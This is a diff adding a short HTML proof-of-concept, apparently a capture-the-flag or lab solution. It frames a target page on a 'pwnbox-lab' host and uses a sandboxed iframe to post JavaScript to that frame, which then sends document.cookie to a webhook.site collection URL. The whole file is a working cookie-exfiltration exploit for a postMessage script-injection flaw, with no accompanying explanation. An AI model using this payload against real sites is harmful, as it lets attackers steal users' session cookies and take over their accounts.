@@ -1,0 +1,15 @@
+<html>
+<body>
+<iframe id="victim" src="https://f2b14bfb076a.pwnbox-lab.com/"></iframe>
+<iframe sandbox="allow-scripts" srcdoc="
+<script>
+setTimeout(function(){
+  top.frames[0].postMessage(
+    &quot;fetch('https://webhook.site/2c9b4bbb-06fa-49eb-8a35-576dcd846603/?c='+encodeURIComponent(document.cookie))&quot;,
+    '*'
+  );
+}, 1500);
+</script>
+"></iframe>
+</body>
+</html>
